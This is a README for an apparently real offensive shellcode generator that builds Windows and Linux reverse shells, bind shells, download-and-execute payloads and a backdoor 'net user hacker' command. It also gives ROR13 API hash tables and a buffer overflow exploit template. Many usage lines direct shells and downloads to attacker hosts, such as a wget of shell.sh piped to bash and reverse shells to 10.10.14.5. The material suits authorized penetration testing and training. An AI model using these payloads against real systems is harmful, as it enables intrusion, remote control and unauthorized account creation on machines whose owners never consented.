# Multi-Architecture Shellcode Generator

A powerful Python-based shellcode generator supporting Windows (x86/x64) and Linux (x86/x64/ARM/ARM64) architectures with automatic bad character avoidance.

## Quick Start

```bash
# List available payloads
./shellgen_cli.py --list-payloads
./hash_generator.py LoadLibraryA

# Generate Windows MessageBox
./shellgen_cli.py --platform windows --payload messagebox --title "Pwned" --message "Hello!"

# Generate Linux ARM64 reverse shell
./shellgen_cli.py --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64

# Generate Windows x86 command execution
./shellgen_cli.py --platform windows --payload winexec --cmd "calc.exe" --arch x86

# Generate API hashes
./hash_generator.py --format python LoadLibraryA GetProcAddress
```

## Project Structure

```
shellgen/
├── src/                        # Core package modules
│   ├── __init__.py             # Package initialization
│   ├── encoders.py             # Bad character encoding
│   ├── assembler.py            # Assembly and verification (Keystone)
│   ├── formatters.py           # Output formatters
│   ├── payloads.py             # High-level payload builders
│   ├── cli.py                  # Command-line interface
│   └── generators/             # OS-specific generators
│       ├── windows.py          # Windows (x86/x64) - PEB walk, API resolution
│       └── linux.py            # Linux (x86/x64/ARM/ARM64) - Syscalls
├── shellgen_cli.py             # Main CLI entry point
├── hash_generator.py           # ROR13 hash generator for API resolution
├── common_apis.txt             # Common Windows API function names
├── README.md                   # This file
└── CLAUDE.md                   # Technical documentation
```

## Installation

### Prerequisites

- Python 3.6 or higher
- python3-venv (virtual environment support)
- Build tools for Keystone Engine

### Recommended: Virtual Environment Installation

Using a dedicated virtual environment is the cleanest and recommended approach.

#### Ubuntu/Debian

```bash
# Install system dependencies
sudo apt update
sudo apt install -y python3 python3-venv python3-pip cmake build-essential

# Navigate to the repo root
cd /path/to/rop_tools

# Create a dedicated virtual environment
python3 -m venv venv

# Activate the virtual environment
source venv/bin/activate

# Install dependencies from consolidated requirements.txt
pip install -r requirements.txt

# Verify installation
cd shellgen && ./shellgen_cli.py --list-payloads
```

#### Fedora/RHEL/CentOS

```bash
# Install system dependencies
sudo dnf install -y python3 python3-pip cmake gcc gcc-c++ make

# Navigate to the repo root
cd /path/to/rop_tools

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies from consolidated requirements.txt
pip install -r requirements.txt

# Verify installation
cd shellgen && ./shellgen_cli.py --list-payloads
```

### Using the Virtual Environment

Every time you want to use the shellcode generator, activate the virtual environment first:

```bash
# Navigate to the repo root
cd /path/to/rop_tools

# Activate the virtual environment
source venv/bin/activate

# Now you can use the tool
cd shellgen && ./shellgen_cli.py --platform linux --payload execve --cmd "whoami" --arch arm64

# When done, deactivate the virtual environment
deactivate
```

## Setting Up as a System Tool

### Option 1: Wrapper Script (Recommended)

Create a wrapper script that automatically activates the virtual environment:

```bash
# Navigate to shellgen directory
cd /path/to/pentest-scripts/shellgen

# Create wrapper script
cat > shellgen-wrapper.sh << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/venv/bin/activate"
"$SCRIPT_DIR/shellgen_cli.py" "$@"
deactivate
EOF

# Make it executable
chmod +x shellgen-wrapper.sh

# Create symlink in ~/bin
mkdir -p ~/bin
ln -s "$(pwd)/shellcode-wrapper.sh" ~/bin/shellgen

# Add to PATH (if not already)
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Now you can run from anywhere
shellgen --list-payloads
shellgen --platform windows --payload messagebox --title "Test" --message "Hello!"
```

### Option 2: Bash Function

Add a bash function to your shell configuration:

```bash
# Add to ~/.bashrc or ~/.zshrc
cat >> ~/.bashrc << 'EOF'

# Shellcode generator function
shellgen() {
    REPO_ROOT="/path/to/rop_tools"
    (cd "$REPO_ROOT" && source venv/bin/activate && cd shellgen && ./shellgen_cli.py "$@")
}
EOF

# Reload shell configuration
source ~/.bashrc

# Now you can run from anywhere
shellgen --list-payloads
```

**Note:** Replace `/path/to/rop_tools` with the actual path to your repo root directory.

## Available Payloads

### Windows (x86/x64)
- **messagebox** - Display MessageBox dialog (x86, x64)
- **winexec** - Execute command via WinExec (x86, x64)
- **createprocess** - Execute via CreateProcessA (flexible process creation) (x86, x64)
- **shellexecute** - Execute via ShellExecuteA (programs/URLs with verbs) (x86, x64)
- **system** - Execute via system() from msvcrt.dll (C runtime) (x86, x64)
- **download_exec** - Download file (URLDownloadToFile) and execute (x86, x64)
- **reverse_shell** - Native socket reverse shell (runs in current process) (x86)
- **reverse_shell_x64** - Native socket reverse shell (x64)
- **reverse_shell_powershell** - PowerShell reverse shell (spawns child process) (x86, x64)
- **bind_shell** - Native socket bind shell (listens for connections) (x86)
- **bind_shell_x64** - Native socket bind shell (x64)
- **bind_shell_simple** - PowerShell bind shell (simple, spawns child process) (x86, x64)

### Linux (x86/x64/ARM/ARM64)
- **execve** - Execute commands via execve syscall (x86, x64, arm, arm64)
- **reverse_shell** - TCP reverse shell (socket + execve) (x86, x64, arm, arm64)
- **bind_shell** - TCP bind shell (listens + execve) (x86, x64, arm, arm64)

## Usage Examples

### Windows Payloads

#### MessageBox
```bash
shellgen --platform windows --payload messagebox \
  --title "Pwned" \
  --message "Hello from shellcode!" \
  --arch x86
```

#### WinExec Command
```bash
shellgen --platform windows --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d \
  --verify
```

#### CreateProcessA Command (More Flexible)
```bash
shellgen --platform windows --payload createprocess \
  --cmd "cmd.exe /c whoami > C:\\output.txt" \
  --arch x86 \
  --show-window 0
```

#### ShellExecuteA (Execute Programs/URLs)
```bash
# Execute a program
shellgen --platform windows --payload shellexecute \
  --cmd "notepad.exe" \
  --arch x86

# Open a URL in browser
shellgen --platform windows --payload shellexecute \
  --cmd "https://example.com" \
  --arch x86
```

#### system() Command (C Runtime)
```bash
shellgen --platform windows --payload system \
  --cmd "net user hacker Password123! /add" \
  --arch x86 \
  --bad-chars 00,0a,0d
```

#### Download & Execute
```bash
shellgen --platform windows --payload download_exec \
  --url "http://10.10.14.5/payload.exe" \
  --save-path "C:\\temp\\p.exe" \
  --arch x86
```

#### Native Socket Reverse Shell (Stealthy - Runs in Current Process)
```bash
# Start listener on attacker machine
nc -lvnp 443

# Generate shellgen with default cmd.exe shell
shellgen --platform windows --payload reverse_shell \
  --host 10.10.14.5 \
  --port 443 \
  --arch x86

# Generate with custom shell (e.g., powershell.exe)
shellgen --platform windows --payload reverse_shell \
  --host 10.10.14.5 \
  --port 443 \
  --shell "powershell.exe" \
  --arch x86

# The native reverse shell:
# - Creates socket via WSASocketA (inheritable by default)
# - Connects to attacker host
# - Redirects stdin/stdout/stderr to socket in STARTUPINFOA
# - Launches specified shell (default: cmd.exe) with bInheritHandles=TRUE
# - Waits for shell process to exit via WaitForSingleObject(INFINITE)
# - Uses NEG encoding (two's complement) for shell string to avoid null bytes
```

#### Windows x64 Native Reverse Shell
```bash
shellgen --platform windows --payload reverse_shell_x64 \
  --host 10.10.14.5 \
  --port 443
```

#### PowerShell Reverse Shell (Reliable - Spawns Child Process)
```bash
shellgen --platform windows --payload reverse_shell_powershell \
  --host 10.10.14.5 \
  --port 443 \
  --arch x86
```

#### Native Bind Shell
```bash
# x86 bind shell
shellgen --platform windows --payload bind_shell \
  --port 4444 \
  --shell "cmd.exe"

# x64 bind shell
shellgen --platform windows --payload bind_shell_x64 \
  --port 4444
```

#### PowerShell Bind Shell (Simple)
```bash
shellgen --platform windows --payload bind_shell_simple \
  --port 4444 \
  --arch x86
```

#### Debug Shellcode for Bad Characters
```bash
# Print opcodes line by line with bad character highlighting
shellgen --platform windows --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d,20 \
  --debug-shellcode

# Output shows:
# - Line number and offset for each instruction
# - Opcodes in hex format
# - Bad characters highlighted in red
# - Summary of total bad characters found
```

### Linux Payloads

#### ARM64 Reverse Shell
```bash
shellgen --platform linux --payload reverse_shell \
  --host 192.168.1.100 \
  --port 4444 \
  --arch arm64 \
  --format python \
  --output revshell_arm64.py
```

#### ARM32 Command Execution
```bash
shellgen --platform linux --payload execve \
  --cmd "wget http://10.10.14.5/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" \
  --arch arm \
  --format c \
  --output payload_arm32.c
```

#### ARM64 Execute /bin/sh
```bash
shellgen --platform linux --payload execve \
  --cmd "/bin/sh" \
  --arch arm64
```

#### Linux x64 Reverse Shell
```bash
shellgen --platform linux --payload reverse_shell \
  --host 10.10.14.5 \
  --port 4444 \
  --arch x64
```

#### Linux ARM Bind Shell
```bash
shellgen --platform linux --payload bind_shell \
  --port 4444 \
  --arch arm \
  --shell "/bin/sh"
```

### Output Formats

#### Assembly Format (default)
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64
# Creates shellgen.asm
```

#### Python Bytes Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format python
```

#### C Array Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format c
```

#### Raw Binary Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format raw --output payload.bin
```

#### Python Assembly Script
```bash
shellgen --platform windows --payload winexec --cmd "calc.exe" --format pyasm --output shellcode_asm.py
# Creates a Python script with assembly code that can be assembled with Keystone
```

The generated pyasm script includes:
- **`BAD_CHARS` set** — populated from your `--bad-chars` (or JSON `bad_chars`)
- **`push_string(s)` helper** — pushes a null-terminated ASCII string onto the stack with automatic bad character encoding. After execution, `ecx`/`rcx` points to the string. Useful for building UNC paths, filenames, or command strings at runtime:
  ```python
  # In the generated script, add to your CODE:
  extra = push_string("\\\\127.0.0.1\\share\\payload.exe")
  CODE += extra + "    mov edi, ecx;"  # save pointer
  ```
- **`_encode_dword(target)` helper** — finds clean SUB/ADD encodings for dwords containing bad characters

### Custom JSON Payloads

For advanced use cases, you can create custom payloads by defining API calls in a JSON file. This allows you to chain together any Windows API functions with precise control over arguments.

#### JSON Payload Format

```json
{
  "bad_chars": ["0x00", "0x0a", "0x0d"],
  "calls": [
    {
      "api": "MessageBoxA",
      "dll": "user32.dll",
      "args": [null, "Hello from custom shellgen!", "Custom Payload", 0]
    }
  ],
  "exit": true
}
```

**Field Descriptions:**
- `bad_chars` - Array of byte values to avoid (optional, defaults to `[0, 10, 13]`)
  - Integers: `[0, 10, 13]`
  - Hex strings: `["0x00", "0x0a", "0x0d"]`
  - Mixed: `[0, "0x0a", 13]`
- `calls` - Array of API call objects (required)
  - `api` - Windows API function name (e.g., "CreateFileA", "WriteFile")
  - `dll` - DLL containing the function (e.g., "kernel32.dll", "user32.dll")
  - `args` - Array of arguments to pass to the function. Supported types:
    - **Integers** (e.g., `1`, `2`, `0x40000000`) — pushed with bad-char encoding
    - **Hex strings** (e.g., `"0x40000000"`) — converted to integers automatically, then pushed with bad-char encoding
    - **`null` or `0`** — NULL pointers, pushed via `xor reg, reg` to avoid NULL bytes
    - **Strings** (e.g., `"C:\\test.txt"`, `"Hello World!"`) — pushed onto the stack, pointer passed as argument
    - **`"REG:reg"`** — register references (e.g., `"REG:eax"`, `"REG:esp"`) — pushes the register value directly
    - **`"MEM:ref"`** — memory references (e.g., `"MEM:[ebp-4]"`, `"MEM:[esp+0x10]"`) — pushes from the specified memory location. Any bracket expression is emitted as `push [ref]`
  - `save_result` - Register to save the return value (EAX) into after the call (optional).
    Emits `mov <reg>, eax` after the API call. Use this to preserve return values across
    multiple calls. The saved register can then be referenced in later calls via `"REG:<reg>"`.
    Common choices: `"esi"`, `"edi"` (callee-saved, won't be clobbered by most API calls).
    **Caution:** String argument preparation uses `edi`, `esi`, `edx` as scratch registers (x86),
    so a saved value may be clobbered if a later call has plain string arguments that trigger
    string prep into the same register.
- `stack_alloc` - Array of stack buffer allocations (optional). Each entry is an object:
  - `name` - Register to point at the allocated buffer (e.g., `"edi"`, `"ebx"`, `"r12"`)
  - `size` - Buffer size in bytes (integer or hex string like `"0x104"`)
  - `init_dword` - Initial DWORD value to write at the buffer start (optional, integer or hex string)
  - Buffers are allocated with a single `sub esp/rsp` and each register gets a `mov`/`lea` to its region
  - Values containing bad characters are automatically encoded
- `exit` - Whether to call ExitProcess at the end (optional, defaults to `true`)

#### Using Custom JSON Payloads

```bash
# Create your custom payload JSON file
cat > my_payload.json << 'EOF'
{
  "bad_chars": ["0x00", "0x0a", "0x0d"],
  "calls": [
    {
      "api": "CreateFileA",
      "dll": "kernel32.dll",
      "args": ["C:\\test.txt", "0x40000000", 0, null, 2, 0, null]
    },
    {
      "api": "WriteFile",
      "dll": "kernel32.dll",
      "args": ["REG:eax", "Hello World!", 12, "REG:esp", 0]
    },
    {
      "api": "CloseHandle",
      "dll": "kernel32.dll",
      "args": ["REG:eax"]
    }
  ],
  "exit": true
}
EOF

# Generate shellgen from JSON (uses bad_chars from JSON)
./shellgen_cli.py --platform windows --json my_payload.json --arch x86

# Override bad_chars from command line (adds 0x20 to bad characters)
./shellgen_cli.py --platform windows --json my_payload.json --arch x86 --bad-chars 00,0a,0d,20
```

**Note:** When using `--json`, the `--bad-chars` CLI argument will override the `bad_chars` specified in the JSON file. The tool will display which source is being used for bad characters.

#### Example: MessageBox Payload (example_payload.json)

The project includes a sample custom payload:

```bash
# View the example
cat example_payload.json

# Generate shellgen from example
./shellgen_cli.py --platform windows --json example_payload.json --arch x86 --format python
```

#### Advanced Example: File Write + Execute

```json
{
  "bad_chars": ["0x00", "0x0a", "0x0d"],
  "calls": [
    {
      "api": "CreateFileA",
      "dll": "kernel32.dll",
      "args": ["C:\\payload.bat", "0x40000000", 0, null, 2, "0x80", null]
    },
    {
      "api": "WriteFile",
      "dll": "kernel32.dll",
      "args": ["REG:eax", "@echo off\r\nnet user hacker Pass123! /add\r\n", 45, "REG:esp", 0]
    },
    {
      "api": "CloseHandle",
      "dll": "kernel32.dll",
      "args": ["REG:eax"]
    },
    {
      "api": "WinExec",
      "dll": "kernel32.dll",
      "args": ["C:\\payload.bat", 0]
    }
  ],
  "exit": true
}
```

#### Stack Buffer Allocation (stack_alloc)

Use `stack_alloc` to pre-allocate stack buffers for API calls that need output pointers (e.g., `GetCurrentDirectoryA`, `GetTempPathA`, `ReadFile`). Each allocation reserves space on the stack and assigns a register to point at it.

```json
{
  "bad_chars": ["0x00", "0x0a", "0x0d"],
  "stack_alloc": [
    {"name": "edi", "size": "0x104"},
    {"name": "ebx", "size": 4, "init_dword": "0x104"}
  ],
  "calls": [
    {
      "api": "GetCurrentDirectoryA",
      "dll": "kernel32.dll",
      "args": ["REG:ebx", "REG:edi"],
      "save_result": "esi"
    },
    {
      "api": "MessageBoxA",
      "dll": "user32.dll",
      "args": [null, "REG:edi", "Current Dir", 0]
    }
  ]
}
```

In this example:
- `edi` points to a 260-byte buffer for the directory path
- `ebx` points to a 4-byte DWORD initialized to 260 (the buffer size)
- Both are allocated with a single `sub esp` instruction
- Values containing bad characters are automatically encoded using the subtraction/addition strategy

#### Register References & save_result

Use `"REG:register_name"` in `args` to reference register values. Use `"save_result"` on a call object to preserve the return value (EAX) in a named register for later use.

**Available registers for `"REG:"`:**
- `"REG:eax"` - Return value from the immediately previous API call
- `"REG:ebx"` - EBX register value
- `"REG:ecx"` - ECX register value
- `"REG:edx"` - EDX register value
- `"REG:esi"` - ESI register value
- `"REG:edi"` - EDI register value
- `"REG:esp"` - Stack pointer (useful for passing pointer to DWORD output parameter)

**x64 registers:** `"REG:rax"`, `"REG:rcx"`, `"REG:rdx"`, `"REG:r8"` through `"REG:r15"`, etc.

**Memory references with `"MEM:"`:**

Use `"MEM:[expression]"` to push a value from a memory location. The bracket expression is emitted directly as `push [expression]` in the generated assembly.

- `"MEM:[ebp-4]"` — push DWORD from `[ebp-4]`
- `"MEM:[esp+0x10]"` — push DWORD from `[esp+0x10]`
- `"MEM:[edi]"` — push DWORD pointed to by `edi`

This is useful for passing pointers or values stored at known stack/memory offsets, such as data from `stack_alloc` buffers or local variables.

**`save_result` field:**

Without `save_result`, the return value in EAX is only available to the *immediately next* call via `"REG:eax"`. If a later call has string arguments, string preparation will clobber EAX before the argument push phase. `save_result` lets you move EAX into a more durable register right after the call returns.

```json
{
  "api": "VirtualAlloc",
  "dll": "kernel32.dll",
  "args": [null, 4096, "0x3000", "0x40"],
  "save_result": "edi"
}
```

This emits `mov edi, eax` after the VirtualAlloc call. Later calls can reference the buffer via `"REG:edi"`.

**Example: Chaining return values across multiple calls:**

```json
{
  "calls": [
    {
      "api": "CreateFileA",
      "dll": "kernel32.dll",
      "args": ["C:\\test.txt", "0x40000000", 0, null, 2, 0, null],
      "save_result": "esi"
    },
    {
      "api": "WriteFile",
      "dll": "kernel32.dll",
      "args": ["REG:esi", "Hello World!", 12, "REG:esp", 0]
    },
    {
      "api": "CloseHandle",
      "dll": "kernel32.dll",
      "args": ["REG:esi"]
    }
  ]
}
```

Without `save_result`, the file handle from `CreateFileA` would be lost after `WriteFile` (whose return value overwrites EAX). With `"save_result": "esi"`, the handle is preserved in ESI for both `WriteFile` and `CloseHandle`.

**Caution:** On x86, string argument preparation uses `edi`, `esi`, `edx` as scratch registers. If a later call has plain string arguments, it may clobber a register you saved into. Plan your register choices accordingly — if a subsequent call has string args that will use `edi`, save into a register that won't be touched (or reorder your calls).

#### Common API Function Arguments

**CreateFileA** — `args: [lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile]`
```json
{
  "api": "CreateFileA",
  "dll": "kernel32.dll",
  "args": ["C:\\path\\to\\file.txt", "0x40000000", 0, null, 2, "0x80", null]
}
```

**WriteFile** — `args: [hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped]`
```json
{
  "api": "WriteFile",
  "dll": "kernel32.dll",
  "args": ["REG:eax", "Hello World!", 12, "REG:esp", 0]
}
```

**MessageBoxA** — `args: [hWnd, lpText, lpCaption, uType]`
```json
{
  "api": "MessageBoxA",
  "dll": "user32.dll",
  "args": [null, "Message text", "Title", 0]
}
```

#### Tips for Custom Payloads

1. **Test incrementally** - Start with simple API calls and add complexity
2. **Use --debug-shellcode** - Identify bad characters in generated opcodes
3. **Reference Windows API docs** - Ensure correct argument order and types
4. **Chain API calls** - Use register references to pass data between calls
5. **Minimize bad chars** - Use NEG encoding for strings when needed
6. **Verify output** - Always test with `--verify` flag

## Command Reference

```
Options:
  --list-payloads           List all available payloads
  --platform {windows,linux}
                            Target platform (required)
  --payload PAYLOAD         Payload name (required unless using --json)
  --arch {x86,x64,arm,arm64}
                            Target architecture (default: x86)
  --format {asm,python,c,raw,pyasm}
                            Output format (default: asm)
  --bad-chars BAD_CHARS     Comma-separated hex bytes to avoid (default: 00)
                            When using --json, this overrides bad_chars from the JSON file

  # Custom payload:
  --json JSON_FILE          Load custom payload from JSON file
                            (replaces --payload and payload-specific options)
                            bad_chars from JSON can be overridden with --bad-chars CLI arg

  # Payload-specific options:
  --title TITLE             MessageBox title
  --message MESSAGE         MessageBox message
  --cmd CMD                 Command to execute
  --show-window N           Window visibility (0=hidden, 1=normal)
  --url URL                 URL to download from
  --save-path PATH          Local path to save file
  --host HOST               Target IP address for reverse shell
  --port PORT               Target port for reverse shell
  --shell SHELL             Shell to execute (e.g., cmd.exe, powershell.exe, /bin/bash)
                            Works with: reverse_shell, reverse_shell_x64,
                            reverse_shell_powershell, bind_shell, bind_shell_x64
                            (Windows), execve (Linux)

  # Output options:
  --output OUTPUT           Output filename (default: shellcode.asm)
  --verify                  Verify assembled shellcode for bad characters
  --debug-shellcode         Print opcodes line by line to identify bad characters
  --no-exit                 Skip ExitProcess at the end (Windows only)
  --generate-completion {bash,zsh}
                            Print shell completion script and exit
```

## Supported Architectures

| Architecture | Platform | Assembler Required | Status         |
|--------------|----------|--------------------|----------------|
| x86 (32-bit) | Windows  | Keystone           | ✅ Full Support |
| x64 (64-bit) | Windows  | Keystone           | ✅ Full Support |
| x86 (32-bit) | Linux    | Keystone           | ✅ Full Support |
| x64 (64-bit) | Linux    | Keystone           | ✅ Full Support |
| ARM32        | Linux    | Keystone           | ✅ Full Support |
| ARM64        | Linux    | Keystone           | ✅ Full Support |

**Important:** All architectures require Keystone Engine.

## Features

- ✅ Multi-architecture support (x86, x64, ARM32, ARM64)
- ✅ Automatic bad character avoidance for Windows payloads
- ✅ Multiple output formats (ASM, Python, C, Raw Binary, PyASM)
- ✅ Built-in shellcode verification
- ✅ **Debug mode**: Line-by-line opcode analysis with bad character highlighting
- ✅ **Enhanced Visual Output**: Colored panels, progress indicators, hex previews
- ✅ **Architecture Matrix**: Interactive table showing payload compatibility
- ✅ Robust PEB walk with kernel32.dll length check (Windows)
- ✅ InInitializationOrderModuleList optimization (Windows)
- ✅ LoadLibraryA support for external DLLs (Windows)
- ✅ Native socket reverse shell with proper handle inheritance (Windows)
- ✅ Direct syscall implementation (Linux)
- ✅ **Stack buffer allocation**: `stack_alloc` JSON field for output buffers with bad char encoding
- ✅ **PyASM push_string helper**: Encodes strings onto the stack avoiding bad characters
- ✅ String consolidation for size optimization
- ✅ ROR13 hash-based function lookup
- ✅ Modular architecture for easy extension

## Visual Features & Output Enhancement

The shellcode generator now includes a rich visual interface with colored output and enhanced formatting (using the shared `lib/color_printer` library):

### Assembly Progress & Success

When generating shellcode, you'll see:
- **Progress indicator**: "⚙ Assembling shellcode with Keystone Engine..."
- **Success panel** (green): Shows shellcode size and instruction count
- **Hex preview**: First 16 bytes displayed in hex + ASCII format

### Bad Character Detection

- **Clean scan** (green panel): "✓ Bad Character Scan - CLEAN"
- **Warning panel** (yellow): "⚠ Bad Character Scan - WARNING" with detailed breakdown
- **Recommendation panel** (cyan): Helpful tips for fixing bad character issues

### API Hash Display

Windows payloads show ROR13 API hashes in a cyan panel box:
- LoadLibraryA and all resolved APIs
- GetCurrentProcess / TerminateProcess for clean exits
- Formatted for easy reference

### Enhanced Payload List

Use `--list-payloads` to see:
- Categorized payloads (Windows/Linux)
- **Architecture support** displayed for each payload
- **Compatibility matrix**: Tables showing which architectures work with each payload
- **Examples section**: Common usage patterns with copy-paste commands
- **Quick tips panel**: Reminders about --arch, --format, --bad-chars

### Colored Output Formats

Output formats automatically detect TTY vs file output:
- **Terminal**: Colored headers, variable names, and syntax highlighting
- **File/pipe**: Plain text with no ANSI codes (safe for scripts)

### Dependencies

Visual features require the Rich library (included in the consolidated requirements.txt at repo root):
```bash
# From repo root
pip install -r requirements.txt
```

If Rich is not available, the tool automatically falls back to plain text output.

## Integration with Exploit Development

### Example: Buffer Overflow Exploit

```python
#!/usr/bin/env python3
import struct

# Generate shellgen with:
# shellgen --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64 --format python

shellcode = b"\x42\x00\x80\xd2\x21\x00\x00\x8b..."  # Your generated shellgen

# Build exploit payload
offset = 264  # Offset to return address
padding = b"A" * offset

# ARM64 little-endian address
ret_addr = struct.pack("<Q", 0xffffdeadbeef)

payload = padding + ret_addr + shellcode

# Send payload to target
with open('exploit_payload.bin', 'wb') as f:
    f.write(payload)

print(f"[+] Exploit payload created: {len(payload)} bytes")
print(f"[+] Shellcode size: {len(shellcode)} bytes")
```

## Using as a Python Library

```python
from src.generators import WindowsGenerator, LinuxGenerator
from src.payloads import windows_messagebox, linux_execve
from src.assembler import assemble_to_binary

# Example 1: Windows MessageBox (x86)
config = windows_messagebox(
    title="Pwned",
    message="Hello from shellgen!",
    bad_chars={0x00, 0x0a, 0x0d}
)

generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='x86')
print(f"Windows x86 shellgen size: {len(shellcode)} bytes")

# Example 2: Linux ARM64 execve
config = linux_execve(
    command="/bin/sh",
    bad_chars={0x00, 0x0a, 0x0d},
    arch='arm64'
)

generator = LinuxGenerator(config['bad_chars'], arch='arm64')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='arm64')
print(f"Linux ARM64 shellgen size: {len(shellcode)} bytes")
```

## Security Notice

This tool is designed for **authorized security testing only**. Use cases include:
- Penetration testing engagements
- Exploit development research
- Red team operations
- Security training
- CTF competitions

**Unauthorized use is illegal and unethical.**

## Architecture-Specific Notes

### Linux (x86/x64/ARM/ARM64)
- Uses direct syscalls (no libc dependencies)
- Syscall numbers:
  - x86: socket=359, connect=362, dup2=63, execve=11
  - x64: socket=41, connect=42, dup2=33, execve=59
  - ARM32: socket=281, connect=283, dup2=63, execve=11
  - ARM64: socket=198, connect=203, dup3=24, execve=221
- Requires Keystone Engine for assembly

### Windows x86/x64
- Robust PEB walk with kernel32.dll length check (24 bytes)
- InInitializationOrderModuleList for fast kernel32 lookup
- ROR13 hashing for API lookup
- LoadLibraryA support for external DLLs
- Automatic bad character encoding

## ROR13 Hash Generator

The `hash_generator.py` tool generates ROR13 hashes for Windows API functions. These hashes are used in shellcode for dynamic API resolution without embedding function name strings.

### Basic Usage

```bash
# Generate hash for a single function
./hash_generator.py LoadLibraryA

# Output:
# ========================================================================
# ROR13 Hash Generator
# ========================================================================
#
# LoadLibraryA  =>  0xec0e4e8e
```

### Multiple Functions

```bash
./hash_generator.py LoadLibraryA GetProcAddress CreateProcessA

# Generates hashes for all specified functions

```

### Read from File

The tool includes `common_apis.txt` with commonly used Windows APIs:

```bash
./hash_generator.py --file common_apis.txt --format python > api_hashes.py
```

### Output Formats

**Python Dictionary:**
```bash
./hash_generator.py --format python LoadLibraryA GetProcAddress
```
```python
API_HASHES = {
    'LoadLibraryA': 0xec0e4e8e,
    'GetProcAddress': 0x7c0dfcaa,
}
```

**Assembly Constants:**
```bash
./hash_generator.py --format asm CreateProcessA TerminateProcess
```
```asm
CREATEPROCESSA_HASH            equ 0x16b3fe72  ; CreateProcessA
TERMINATEPROCESS_HASH          equ 0x78b5b983  ; TerminateProcess
```

**C Struct Array:**
```bash
./hash_generator.py --format c MessageBoxA ExitProcess
```

**JSON:**
```bash
./hash_generator.py --format json WSAStartup WSASocketA
```

### Verify Hashes

```bash
./hash_generator.py --verify "CreateProcessA:0x16b3fe72"
# Output:
# Function: CreateProcessA
# Expected: 0x16b3fe72
# Actual:   0x16b3fe72
# ✓ MATCH
```

### Integration with Shellcode

Use the generated hashes in custom shellcode:

```asm
; Resolve CreateProcessA from kernel32.dll
push 0x16b3fe72               ; CreateProcessA hash
call find_function            ; Your ROR13 hash lookup function
; EAX now contains address of CreateProcessA
```

Or import in Python:

```python
from hash_generator import ror13_hash

# Generate hash for any API function
hash_val = ror13_hash("CreateFileA")
print(f"push 0x{hash_val:08x}    ; CreateFileA hash")
```

### Common API Hashes

| Function           | Hash       | DLL          |
|--------------------|------------|--------------|
| LoadLibraryA       | 0xec0e4e8e | kernel32.dll |
| GetProcAddress     | 0x7c0dfcaa | kernel32.dll |
| CreateProcessA     | 0x16b3fe72 | kernel32.dll |
| TerminateProcess   | 0x78b5b983 | kernel32.dll |
| WinExec            | 0x0e8afe98 | kernel32.dll |
| MessageBoxA        | 0xbc4da2a8 | user32.dll   |
| WSAStartup         | 0x3bfcedcb | ws2_32.dll   |
| WSASocketA         | 0xadf509d9 | ws2_32.dll   |
| WSAConnect         | 0xb32dba0c | ws2_32.dll   |

## Shell Completion

Both `shellgen` and `hash_generator` support auto-generated shell completions:

```bash
# Bash — add to ~/.bashrc or ~/.bash_completion.d/
shellgen --generate-completion bash >> ~/.bashrc
hash_generator --generate-completion bash >> ~/.bashrc

# Zsh — place in $fpath directory
shellgen --generate-completion zsh > ~/.zsh/completions/_shellgen
hash_generator --generate-completion zsh > ~/.zsh/completions/_hash_generator
```

Completions are auto-generated from the argparse parser, so new flags are
automatically included.

## Troubleshooting

### "No module named 'keystone'"

Make sure you're in the virtual environment:
```bash
source venv/bin/activate
pip install keystone-engine
```

### "Cannot encode 0x... avoiding bad chars"

The encoder couldn't find clean values. Try:
- Reducing bad character restrictions
- Using a different payload type
- Different command/string values

### Keystone build fails on older systems

See the installation troubleshooting section in the original README or install from source.

## Documentation

- **README.md** - Installation and usage (this file)
- **CLAUDE.md** - Technical documentation and implementation details

## Additional Resources

- **Keystone Engine** - https://www.keystone-engine.org/
- **ARM Syscall Reference** - https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
- **Windows PEB Structure** - https://en.wikipedia.org/wiki/Process_Environment_Block

## Uninstallation

### Remove Virtual Environment
```bash
cd /path/to/rop_tools
rm -rf venv
```

### Remove Wrapper Script/Symlink
```bash
rm ~/bin/shellgen
rm shellgen-wrapper.sh
```

## License

For authorized security testing and research purposes only.

## Author

Dawid Esterhuizen

---

**Note:** Always ensure you have explicit permission before testing on any system you do not own.
